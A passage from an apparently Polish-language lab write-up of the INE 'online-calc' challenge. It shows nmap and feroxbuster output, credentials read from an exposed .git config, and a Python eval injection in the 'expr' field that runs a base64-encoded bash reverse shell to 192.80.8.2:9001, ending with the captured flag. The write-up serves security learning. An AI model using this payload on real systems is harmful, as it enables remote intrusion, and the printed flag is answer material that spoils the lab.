+|     &lt;!DOCTYPE html&gt;&lt;html lang<span style="color:#f92672">=</span>en&gt;&lt;head&gt;&lt;meta charset<span style="color:#f92672">=</span>utf-8&gt;&lt;meta http-equiv<span style="color:#f92672">=</span>X-UA-Compatible content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IE=edge&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span>viewport content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width,initial-scale=1&#34;</span>&gt;&lt;link rel<span style="color:#f92672">=</span>icon href<span style="color:#f92672">=</span>/favicon.ico&gt;&lt;title&gt;online-calc&lt;/title&gt;&lt;style type<span style="color:#f92672">=</span>text/css&gt;/* Your local CSS File */
+|     @font-face <span style="color:#f92672">{</span>
+|     font-family: <span style="color:#e6db74">&#39;Roboto&#39;</span>;
+|     font-style: normal;
+|     font-weight: 700;
+|     src: local<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Roboto-Regular&#39;</span><span style="color:#f92672">)</span>, local<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Roboto-Medium&#39;</span><span style="color:#f92672">)</span>, url<span style="color:#f92672">(</span>fonts/Roboto-Medium.ttf<span style="color:#f92672">)</span> format<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;truetype&#39;</span><span style="color:#f92672">)</span>;
+|_    <span style="color:#f92672">}</span>&lt;/style&gt;&lt;link href<span style="color:#f92672">=</span>/css/main.7ee6b179.css rel<span style="color:#f92672">=</span>prefetch&gt;&lt;link href<span style="color:#f92672">=</span>/js/main.7112507e.js rel<span style="color:#f92672">=</span>prefetch&gt;&lt;link hre
+8000/tcp open  http    Werkzeug httpd 1.0.1 <span style="color:#f92672">(</span>Python 2.7.17<span style="color:#f92672">)</span>
+|_http-title: Site doesnt have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
+| http-git: 
+|   192.154.245.3:8000/.git/
+|     Git repository found!
+|     .git/config matched patterns <span style="color:#e6db74">&#39;passw&#39;</span> <span style="color:#e6db74">&#39;user&#39;</span>
+|     Repository description: Unnamed repository; edit this file <span style="color:#e6db74">&#39;description&#39;</span> to name the...
+|     Last commit message: Minor formatting and removed unneeded functions... 
+|     Remotes:
+|_      http://online-calc.com/projects/online-calc
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port5000-TCP:V<span style="color:#f92672">=</span>7.92%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>6/20%Time<span style="color:#f92672">=</span>62AFB691%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>Ge
+SF:tRequest,583,HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span>201127<span style="color:#ae81ff">\r\n</span>Cont
+SF:ent-Disposition:<span style="color:#ae81ff">\x</span>20inline;<span style="color:#ae81ff">\x</span>20filename<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>index<span style="color:#ae81ff">\.</span>html<span style="color:#ae81ff">\&#34;\r\n</span>Accept-Range
+SF:s:<span style="color:#ae81ff">\x</span>20bytes<span style="color:#ae81ff">\r\n</span>ETag:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\&#34;</span>e021c45eee1c6fcb7629edafba897555f86958c5<span style="color:#ae81ff">\&#34;\r\
+</span><span style="color:#ae81ff"></span>SF:nContent-Type:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Vary:<span style="color:#ae81ff">\x</span>20Accept-Encodi
+SF:ng<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Sun,<span style="color:#ae81ff">\x</span>2019<span style="color:#ae81ff">\x</span>20Jun<span style="color:#ae81ff">\x</span>202022<span style="color:#ae81ff">\x</span>2023:51:45<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connecti
+SF:on:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>&lt;!DOCTYPE<span style="color:#ae81ff">\x</span>20html&gt;&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span>en&gt;&lt;head&gt;&lt;meta<span style="color:#ae81ff">\x</span>20c
+SF:harset<span style="color:#f92672">=</span>utf-8&gt;&lt;meta<span style="color:#ae81ff">\x</span>20http-equiv<span style="color:#f92672">=</span>X-UA-Compatible<span style="color:#ae81ff">\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>IE<span style="color:#f92672">=</span>edge<span style="color:#ae81ff">\&#34;</span>
+SF:&gt;&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span>viewport<span style="color:#ae81ff">\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,initial-scale<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+SF:<span style="color:#ae81ff">\&#34;</span>&gt;&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span>icon<span style="color:#ae81ff">\x</span>20href<span style="color:#f92672">=</span>/favicon<span style="color:#ae81ff">\.</span>ico&gt;&lt;title&gt;online-calc&lt;/title&gt;&lt;s
+SF:tyle<span style="color:#ae81ff">\x</span>20type<span style="color:#f92672">=</span>text/css&gt;/<span style="color:#ae81ff">\*\x</span>20Your<span style="color:#ae81ff">\x</span>20local<span style="color:#ae81ff">\x</span>20CSS<span style="color:#ae81ff">\x</span>20File<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\*</span>/<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20@font-face<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span><span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0<span style="color:#ae81ff">\x</span>20font-family:<span style="color:#ae81ff">\x</span>20<span style="color:#e6db74">&#39;Roboto&#39;</span>;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0font-style:<span style="color:#ae81ff">\x</span>20normal;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20font-w
+SF:eight:<span style="color:#ae81ff">\x</span>20700;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20src:<span style="color:#ae81ff">\x</span>20local<span style="color:#ae81ff">\(</span>
+SF:<span style="color:#e6db74">&#39;Roboto-Regular&#39;</span><span style="color:#ae81ff">\)</span>,<span style="color:#ae81ff">\x</span>20local<span style="color:#ae81ff">\(</span><span style="color:#e6db74">&#39;Roboto-Medium&#39;</span><span style="color:#ae81ff">\)</span>,<span style="color:#ae81ff">\x</span>20url<span style="color:#ae81ff">\(</span>fonts/Roboto-M
+SF:edium<span style="color:#ae81ff">\.</span>ttf<span style="color:#ae81ff">\)\x</span>20format<span style="color:#ae81ff">\(</span><span style="color:#e6db74">&#39;truetype&#39;</span><span style="color:#ae81ff">\)</span>;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">}</span>&lt;/style
+SF:&gt;&lt;link<span style="color:#ae81ff">\x</span>20href<span style="color:#f92672">=</span>/css/main<span style="color:#ae81ff">\.</span>7ee6b179<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span>prefetch&gt;&lt;link<span style="color:#ae81ff">\x</span>20href<span style="color:#f92672">=</span>/
+SF:js/main<span style="color:#ae81ff">\.</span>7112507e<span style="color:#ae81ff">\.</span>js<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span>prefetch&gt;&lt;link<span style="color:#ae81ff">\x</span>20hre<span style="color:#e6db74">&#34;)%r(RTSPRequest,2F,&#34;</span>
+SF:HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;)%r(
+</span><span style="color:#e6db74">SF:DNSVersionBindReqTCP,2F,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Connecti
+SF:on:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;)%r(SMBProgNeg,2F,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Requ
+SF:est<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;)%r(ZendJavaBridge,2F,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;)%r(HTTPOptions,
+</span><span style="color:#e6db74">SF:583,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span>201127<span style="color:#ae81ff">\r\n</span>Content-Dispo
+SF:sition:<span style="color:#ae81ff">\x</span>20inline;<span style="color:#ae81ff">\x</span>20filename<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>index<span style="color:#ae81ff">\.</span>html<span style="color:#ae81ff">\&#34;\r\n</span>Accept-Ranges:<span style="color:#ae81ff">\x</span>20byt
+SF:es<span style="color:#ae81ff">\r\n</span>ETag:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\&#34;</span>e021c45eee1c6fcb7629edafba897555f86958c5<span style="color:#ae81ff">\&#34;\r\n</span>Content-
+SF:Type:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Vary:<span style="color:#ae81ff">\x</span>20Accept-Encoding<span style="color:#ae81ff">\r\n</span>Dat
+SF:e:<span style="color:#ae81ff">\x</span>20Sun,<span style="color:#ae81ff">\x</span>2019<span style="color:#ae81ff">\x</span>20Jun<span style="color:#ae81ff">\x</span>202022<span style="color:#ae81ff">\x</span>2023:51:45<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20cl
+SF:ose<span style="color:#ae81ff">\r\n\r\n</span>&lt;!DOCTYPE<span style="color:#ae81ff">\x</span>20html&gt;&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span>en&gt;&lt;head&gt;&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>ut
+SF:f-8&gt;&lt;meta<span style="color:#ae81ff">\x</span>20http-equiv<span style="color:#f92672">=</span>X-UA-Compatible<span style="color:#ae81ff">\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>IE<span style="color:#f92672">=</span>edge<span style="color:#ae81ff">\&#34;</span>&gt;&lt;meta<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0name<span style="color:#f92672">=</span>viewport<span style="color:#ae81ff">\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,initial-scale<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\&#34;</span>&gt;&lt;link<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:x20rel<span style="color:#f92672">=</span>icon<span style="color:#ae81ff">\x</span>20href<span style="color:#f92672">=</span>/favicon<span style="color:#ae81ff">\.</span>ico&gt;&lt;title&gt;online-calc&lt;/title&gt;&lt;style<span style="color:#ae81ff">\x</span>20t
+SF:ype<span style="color:#f92672">=</span>text/css&gt;/<span style="color:#ae81ff">\*\x</span>20Your<span style="color:#ae81ff">\x</span>20local<span style="color:#ae81ff">\x</span>20CSS<span style="color:#ae81ff">\x</span>20File<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\*</span>/<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>
+SF:20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20@font-face<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span><span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20font
+SF:-family:<span style="color:#ae81ff">\x</span>20<span style="color:#e6db74">&#39;Roboto&#39;</span>;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20font-sty
+SF:le:<span style="color:#ae81ff">\x</span>20normal;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20font-weight:<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0700;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20src:<span style="color:#ae81ff">\x</span>20local<span style="color:#ae81ff">\(</span><span style="color:#e6db74">&#39;Roboto-R
+</span><span style="color:#e6db74">SF:egular&#39;</span><span style="color:#ae81ff">\)</span>,<span style="color:#ae81ff">\x</span>20local<span style="color:#ae81ff">\(</span><span style="color:#e6db74">&#39;Roboto-Medium&#39;</span><span style="color:#ae81ff">\)</span>,<span style="color:#ae81ff">\x</span>20url<span style="color:#ae81ff">\(</span>fonts/Roboto-Medium<span style="color:#ae81ff">\.</span>tt
+SF:f<span style="color:#ae81ff">\)\x</span>20format<span style="color:#ae81ff">\(</span><span style="color:#e6db74">&#39;truetype&#39;</span><span style="color:#ae81ff">\)</span>;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">}</span>&lt;/style&gt;&lt;link<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0href<span style="color:#f92672">=</span>/css/main<span style="color:#ae81ff">\.</span>7ee6b179<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span>prefetch&gt;&lt;link<span style="color:#ae81ff">\x</span>20href<span style="color:#f92672">=</span>/js/main<span style="color:#ae81ff">\.</span>
+SF:7112507e<span style="color:#ae81ff">\.</span>js<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span>prefetch&gt;&lt;link<span style="color:#ae81ff">\x</span>20hre<span style="color:#f92672">)</span>;
+MAC Address: 02:42:C0:9A:F5:03 <span style="color:#f92672">(</span>Unknown<span style="color:#f92672">)</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.85 seconds
+</code></pre></div><p>Od razu moją uwagę przykuł <code>port 8000</code>. Sprawdziłem go najpierw małym słownikiem <code>common.txt</code>, a następnie większym, domyślnym <code>raft-medium-directories.txt</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@INE:~# feroxbuster -u http://online-calc.com:8000 -w /usr/share/seclists/Discovery/Web-Content/common.txt 
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__<span style="color:#f92672">)</span> |__<span style="color:#f92672">)</span> | /  <span style="color:#e6db74">`</span>    /  <span style="color:#ae81ff">\ \_</span>/ | |  <span style="color:#ae81ff">\ </span>|__
+|    |___ |  <span style="color:#ae81ff">\ </span>|  <span style="color:#ae81ff">\ </span>| <span style="color:#ae81ff">\_</span>_,    <span style="color:#ae81ff">\_</span>_/ / <span style="color:#ae81ff">\ </span>| |__/ |___
+by Ben <span style="color:#e6db74">&#34;epi&#34;</span> Risher 邏                 ver: 2.4.1
+───────────────────────────┬──────────────────────
+   Target Url            │ http://online-calc.com:8000
+   Threads               │ <span style="color:#ae81ff">50</span>
+   Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
+   Status Codes          │ <span style="color:#f92672">[</span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500<span style="color:#f92672">]</span>
+   Timeout <span style="color:#f92672">(</span>secs<span style="color:#f92672">)</span>        │ <span style="color:#ae81ff">7</span>
+ 說  User-Agent            │ feroxbuster/2.4.1
+   Config File           │ /etc/feroxbuster/ferox-config.toml
+   Recursion Depth       │ <span style="color:#ae81ff">4</span>
+───────────────────────────┴──────────────────────
+   Press <span style="color:#f92672">[</span>ENTER<span style="color:#f92672">]</span> to use the Scan Management Menu™
+──────────────────────────────────────────────────
+<span style="color:#ae81ff">200</span>        1l        2w       23c http://online-calc.com:8000/.git/HEAD
+<span style="color:#ae81ff">200</span>       92l      244w     1474c http://online-calc.com:8000/.git/config
+<span style="color:#ae81ff">200</span>        2l        4w      209c http://online-calc.com:8000/.git/index
+<span style="color:#ae81ff">200</span>       52l      186w     1985c http://online-calc.com:8000/console
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@INE:~# feroxbuster -u http://192.154.245.3:8000
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__<span style="color:#f92672">)</span> |__<span style="color:#f92672">)</span> | /  <span style="color:#e6db74">`</span>    /  <span style="color:#ae81ff">\ \_</span>/ | |  <span style="color:#ae81ff">\ </span>|__
+|    |___ |  <span style="color:#ae81ff">\ </span>|  <span style="color:#ae81ff">\ </span>| <span style="color:#ae81ff">\_</span>_,    <span style="color:#ae81ff">\_</span>_/ / <span style="color:#ae81ff">\ </span>| |__/ |___
+by Ben <span style="color:#e6db74">&#34;epi&#34;</span> Risher 邏                 ver: 2.4.1
+───────────────────────────┬──────────────────────
+   Target Url            │ http://192.154.245.3:8000
+   Threads               │ <span style="color:#ae81ff">50</span>
+   Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+   Status Codes          │ <span style="color:#f92672">[</span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500<span style="color:#f92672">]</span>
+   Timeout <span style="color:#f92672">(</span>secs<span style="color:#f92672">)</span>        │ <span style="color:#ae81ff">7</span>
+ 說  User-Agent            │ feroxbuster/2.4.1
+   Config File           │ /etc/feroxbuster/ferox-config.toml
+   Recursion Depth       │ <span style="color:#ae81ff">4</span>
+───────────────────────────┴──────────────────────
+   Press <span style="color:#f92672">[</span>ENTER<span style="color:#f92672">]</span> to use the Scan Management Menu™
+──────────────────────────────────────────────────
+<span style="color:#ae81ff">200</span>       52l      186w     1985c http://192.154.245.3:8000/console
+<span style="color:#ae81ff">200</span>        1l        3w       31c http://192.154.245.3:8000/evaluate
+<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 1m     29999/29999   0s      found:2       errors:1      </span>
+<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 1m     29999/29999   452/s   http://192.154.245.3:8000</span>
+</code></pre></div><h3 id="console"><code>/console</code><a hidden class="anchor" aria-hidden="true" href="#console">#</a></h3>
+<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220620015937.png" alt=""  />
+</p>
+<h3 id="evaluate"><code>/evaluate</code><a hidden class="anchor" aria-hidden="true" href="#evaluate">#</a></h3>
+<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220620020133.png" alt=""  />
+</p>
+<p>Podstrona <code>/console</code> zdaje się mieć zabezpieczenie poprzez PIN. Sprawdziłem jak wpisanie przykładowego pinu i wciśnięcię <code>Confirm PIN</code> widać w <code>BurpSuite</code>.</p>
+<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220620020358.png" alt=""  />
+</p>
+<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220620020440.png" alt=""  />
+</p>
+<p>Zmieniłem jedną cyfre w pinie. Parametr <code>s</code> nie zmienił się. Postanowiłem spróbować bruteforca, ponieważ serwer daje wyraźny response o niepoprawnym pinie.</p>
+<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220620020653.png" alt=""  />
+</p>
+<h3 id="git"><code>/.git</code><a hidden class="anchor" aria-hidden="true" href="#git">#</a></h3>
+<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220620125947.png" alt=""  />
+</p>
+<p>Są pewne dane dostępu <code>jeremy:diamonds</code>.</p>
+<p>Jest również wzmianka o dodatkowym URLu. Ponieważ jest to <code>remote orgin</code>, prawdopodobnie możemy go sklonować.</p>
+<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220620133221.png" alt=""  />
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@INE:~# git clone http://online-calc.com/projects/online-calc
+Cloning into <span style="color:#e6db74">&#39;online-calc&#39;</span>...
+remote: Counting objects: 26, <span style="color:#66d9ef">done</span>.
+remote: Compressing objects: 100% <span style="color:#f92672">(</span>26/26<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+remote: Total <span style="color:#ae81ff">26</span> <span style="color:#f92672">(</span>delta 8<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>delta 0<span style="color:#f92672">)</span>
+Unpacking objects: 100% <span style="color:#f92672">(</span>26/26<span style="color:#f92672">)</span>, 4.25 KiB | 724.00 KiB/s, <span style="color:#66d9ef">done</span>.
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@INE:~/online-calc# ls -al
+total <span style="color:#ae81ff">24</span>
+drwxr-xr-x <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">20</span> 17:03 .
+drwx------ <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">20</span> 17:03 ..
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">2233</span> Jun <span style="color:#ae81ff">20</span> 17:03 API.py
+drwxr-xr-x <span style="color:#ae81ff">8</span> root root <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">20</span> 17:03 .git
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">387</span> Jun <span style="color:#ae81ff">20</span> 17:03 utils.py
+</code></pre></div><p>Plik <code>API.py</code> zawiera informacje o działaniu kalkulatora z portu <code>5000</code>.</p>
+<h3 id="test-aplikacji-kalkulatora-burpsuite">Test aplikacji kalkulatora BurpSuite<a hidden class="anchor" aria-hidden="true" href="#test-aplikacji-kalkulatora-burpsuite">#</a></h3>
+<p>Po wykonaniu testowego &ldquo;zapytania&rdquo; otrzymałem w Burpie taki request.</p>
+<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220620135411.png" alt=""  />
+</p>
+<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220620142508.png" alt=""  />
+</p>
+<p>Prawdopodobnie chodzi o parametr <code>expr</code>. Dozwolone znaki to <code>0123456789+-*/%.()&quot;</code>. Niestety po zbyt wielu próbach jest komunikat <code>Access Denied&quot;: &quot;Too many requests.</code>, zatem zawaansowany sqlmap nie wchodzi w grę.</p>
+<p>Można powiedzieć, że uzyskałem <code>Command Injection</code>. Zauważyłem, że przy wpisywaniu funkcji Pythona, API wyrzuca komunikaty. Można to wykorzystać importując bibliotekę <code>os</code>, która pozwala na wykonywanie prostych komend.</p>
+<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220620182546.png" alt=""  />
+</p>
+<p>Rozumiałem, że muszę oszukać system, by przechwycić &ldquo;nieporządane&rdquo; znaki do payloada. Dodałem wszystkie duże i małe litery oraz inne do dozwolonych znaków. W ten sposób program &ldquo;przepuszcza&rdquo; mój request.</p>
+<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621000817.png" alt=""  />
+</p>
+<p>Ostateczny payload wygląda tak:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{<span style="color:#e6db74">&#34;expr&#34;</span>:<span style="color:#e6db74">&#34;__import__(&#39;os&#39;).system(&#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuODAuOC4yLzkwMDEgMD4mMSIK | base64 -d | bash&#39;)&#34;</span>}
+</code></pre></div><p>Wykonuje on poniższy kod:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">bash <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/192.80.8.2/9001 0&gt;&amp;1&#34;</span>
+</code></pre></div><p>Nasłuchiwanie na porcie <code>9001</code> i uruchomienie requesta w <code>BurpSuite</code> powoduje otrzymanie shella.</p>
+<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621000930.png" alt=""  />
+</p>
+<p>W folderze roota nie było flagi. Znalazłem ją poprzez <code>find</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find . -name flag
+</code></pre></div><p>Flaga była w folderze <code>/tmp</code></p>
+<p><code>flag</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">3b2b474c06380f696b38c1498f795e054374
